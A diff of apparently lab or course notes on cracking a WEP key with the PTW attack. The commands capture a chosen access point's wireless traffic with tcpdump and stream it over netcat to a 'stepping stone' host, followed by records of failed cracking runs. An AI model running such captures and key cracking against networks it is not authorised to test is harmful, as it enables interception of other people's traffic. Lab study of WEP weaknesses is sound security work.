@@ -35,9 +35,13 @@
 nc -l -p 8080 > "tcpdump_run01-$(date +%s).cap"
 ```
 
-##### Capture packets for PTW attack with `tcpudmp` on node6:
+### PTW attack with `tcpudmp` on node6:
 
-###### First try:
+#### First try:
+
+###### Capture packets:
+
+We used tcpdump, because `airodump-ng` makes the files locally and we couldnt find a way to forward them to stepping stone, which was needed because of lack of space on nodes.
 
 ```
 tcpdump -i wlan1 -G 10800 -W 1 -w- -s 65535 ether src or dst 00:1b:b1:01:dc:b2 | nc 172.17.3.1 8080 &
@@ -52,25 +56,7 @@ Options:
 * `-s 65535` : capture whole packets
 * `ether src or dst 00:1b:b1:01:dc:b2` : Capture packets only on selected wlan, more specifically, with source or destination of the MAC of AP
 
-###### Second try:
-
-
-```
-tcpdump -i wlan1 -c 300000 -w- -s 65535 ether src or dst 00:1b:b1:01:dc:b2 | nc 172.17.3.1 8080 &
-```
-
-Options:
-
-* `-i wlan1` : Capture on interface wlan1
-* `-c 300000` : stop after 300.000 captured packets
-* `-w-` : write to output (piped to nc, which sends it to SteppingStone)
-* `-s 65535` : capture whole packets
-* `ether src or dst 00:1b:b1:01:dc:b2` : Capture packets only on selected wlan, more specifically, with source or destination of the MAC of AP
-   
-
-##### Results for 1st and 2nd try:
-
-###### First try:
+##### Results:
 
 * `capinfos -A tcpdump_run01-1483830885-filtered.cap` :
 
@@ -145,7 +131,23 @@ Starting PTW attack with 1926031 ivs.
 Failed. Next try with 1930000 IVs.
 ```
 
-###### Second try:
+#### Second try:
+
+###### Capture packets:
+
+```
+tcpdump -i wlan1 -c 300000 -w- -s 65535 ether src or dst 00:1b:b1:01:dc:b2 | nc 172.17.3.1 8080 &
+```
+
+Options:
+
+* `-i wlan1` : Capture on interface wlan1
+* `-c 300000` : stop after 300.000 captured packets
+* `-w-` : write to output (piped to nc, which sends it to SteppingStone)
+* `-s 65535` : capture whole packets
+* `ether src or dst 00:1b:b1:01:dc:b2` : Capture packets only on selected wlan, more specifically, with source or destination of the MAC of AP
+
+##### Results:
 
 * `capinfos -A tcpdump_run02-1483874801.cap` :
 
@@ -221,4 +223,22 @@ Starting PTW attack with 197335 ivs.
 Failed. Next try with 200000 IVs.
 
 ```
+
+#### Third try:
+
+###### Capture packets:
+
+```
+tcpdump -i wlan1 -c 3000000 -w- -s 65535 ether src or dst 00:1b:b1:01:dc:b2 | nc 172.17.3.1 8080 &
+```
+
+Options:
+
+* `-i wlan1` : Capture on interface wlan1
+* `-c 3000000` : stop after 3.000.000 captured packets
+* `-w-` : write to output (piped to nc, which sends it to SteppingStone)
+* `-s 65535` : capture whole packets
+* `ether src or dst 00:1b:b1:01:dc:b2` : Capture packets only on selected wlan, more specifically, with source or destination of the MAC of AP
+
+
 
